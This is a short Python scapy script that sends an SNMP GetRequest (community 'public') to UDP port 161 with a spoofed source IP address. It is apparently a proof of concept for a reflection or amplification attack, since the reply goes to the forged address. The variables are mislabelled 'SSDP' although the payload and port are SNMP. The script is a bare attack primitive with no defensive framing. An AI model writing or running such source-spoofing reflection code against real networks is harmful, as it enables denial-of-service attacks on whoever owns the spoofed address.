from scapy.all import *

spoofedIPsrc="192.168.123.3"
SSDPserver="192.168.123.7"
 
payload='0o\x02\x01\x00\x04\x06public\xa0b\x02\x04\x1bhM?\x02\x01\x00\x02\x01\x000T0\x0c\x06\x08+\x06\x01\x02\x01\x01\x01\x00\x05\x000\x0c\x06\x08+\x06\x01\x02\x01\x01\x02\x00\x05\x000\x0c\x06\x08+\x06\x01\x02\x01\x01\x04\x00\x05\x000\x0c\x06\x08+\x06\x01\x02\x01\x01\x05\x00\x05\x000\x0c\x06\x08+\x06\x01\x02\x01\x01\x06\x00\x05\x000\x0c\x06\x08+\x06\x01\x02\x01\x01\x07\x00\x05\x00'
ssdpRequest = IP(src=spoofedIPsrc,dst=SSDPserver) / UDP(sport=161, dport=161) / payload
sr1(ssdpRequest)
